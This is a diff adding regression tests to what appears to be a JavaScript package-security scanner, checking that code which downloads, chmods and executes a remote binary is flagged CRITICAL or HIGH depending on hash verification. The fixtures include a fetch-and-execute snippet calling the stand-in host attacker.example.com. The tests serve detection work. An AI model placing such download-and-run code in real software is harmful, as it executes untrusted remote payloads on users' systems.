@@ -193,6 +193,126 @@ async function runAstTests() {
     } finally { cleanupTemp(tmp); }
   });
 
+  // ============================================
+  // v2.10.95: download_exec_binary triple-gate downgrade
+  // ============================================
+
+  // Regression TP: fetch + chmod + exec, no hash, untrusted host → CRITICAL (unchanged)
+  await asyncTest('AST: download_exec_binary without hash verification stays CRITICAL', async () => {
+    const code = `
+const https = require('https');
+const fs = require('fs');
+const { execSync } = require('child_process');
+https.get('https://attacker.example.com/payload', (res) => {
+  res.pipe(fs.createWriteStream('/tmp/payload'));
+  res.on('end', () => {
+    fs.chmodSync('/tmp/payload', 0o755);
+    execSync('/tmp/payload');
+  });
+});
+`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'download_exec_binary');
+      assert(t, 'Should detect download_exec_binary');
+      assert(t.severity === 'CRITICAL', `Expected CRITICAL without hash, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // Regression TP: hash present but no comparison → hardened hasHashVerification returns false → CRITICAL
+  await asyncTest('AST: download_exec_binary with createHash+digest but no comparison stays CRITICAL', async () => {
+    const code = `
+const https = require('https');
+const fs = require('fs');
+const crypto = require('crypto');
+const { execSync } = require('child_process');
+https.get('https://github.com/user/repo/releases/download/v1.0/bin', (res) => {
+  const chunks = [];
+  res.on('data', c => chunks.push(c));
+  res.on('end', () => {
+    const buf = Buffer.concat(chunks);
+    const hash = crypto.createHash('sha256').update(buf).digest('hex');
+    fs.writeFileSync('/tmp/bin', buf);
+    fs.chmodSync('/tmp/bin', 0o755);
+    execSync('/tmp/bin');
+  });
+});
+`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'download_exec_binary');
+      assert(t, 'Should detect download_exec_binary');
+      assert(t.severity === 'CRITICAL', `Expected CRITICAL without hash comparison, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // Hash with comparison: downgrades to HIGH (legitimate binary installer pattern)
+  // Note: an additional MEDIUM tier based on trusted-host allowlist was tried in v2.10.95
+  // but had 0 FPR impact on the 545 benign corpus (see data/fp-v2.10.95-validation.md)
+  // and was reverted. This test verifies the preserved HIGH downgrade.
+  await asyncTest('AST: download_exec_binary with verified hash → HIGH', async () => {
+    const code = `
+const https = require('https');
+const fs = require('fs');
+const crypto = require('crypto');
+const { execSync } = require('child_process');
+const EXPECTED = 'abc123def456';
+https.get('https://github.com/user/repo/releases/download/v1.0/bin', (res) => {
+  const chunks = [];
+  res.on('data', c => chunks.push(c));
+  res.on('end', () => {
+    const buf = Buffer.concat(chunks);
+    const hash = crypto.createHash('sha256').update(buf).digest('hex');
+    if (hash !== EXPECTED) {
+      throw new Error('hash mismatch');
+    }
+    fs.writeFileSync('/tmp/bin', buf);
+    fs.chmodSync('/tmp/bin', 0o755);
+    execSync('/tmp/bin');
+  });
+});
+`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'download_exec_binary');
+      assert(t, 'Should detect download_exec_binary');
+      assert(t.severity === 'HIGH', `Expected HIGH with verified hash, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // Regression TP: hash with comparison BUT URL not on allowlist → HIGH (unchanged old behavior)
+  await asyncTest('AST: download_exec_binary with verified hash + untrusted host stays HIGH', async () => {
+    const code = `
+const https = require('https');
+const fs = require('fs');
+const crypto = require('crypto');
+const { execSync } = require('child_process');
+const EXPECTED = 'abc123def456';
+https.get('https://mirror.example.org/bin.tgz', (res) => {
+  const chunks = [];
+  res.on('data', c => chunks.push(c));
+  res.on('end', () => {
+    const buf = Buffer.concat(chunks);
+    const hash = crypto.createHash('sha256').update(buf).digest('hex');
+    if (hash !== EXPECTED) throw new Error('bad hash');
+    fs.writeFileSync('/tmp/bin', buf);
+    fs.chmodSync('/tmp/bin', 0o755);
+    execSync('/tmp/bin');
+  });
+});
+`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'download_exec_binary');
+      assert(t, 'Should detect download_exec_binary');
+      assert(t.severity === 'HIGH', `Expected HIGH (hash without trusted-host allowlist), got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
   // --- crypto.createDecipher / createDecipheriv ---
 
   await asyncTest('AST: Detects crypto.createDecipher (flatmap-stream pattern)', async () => {
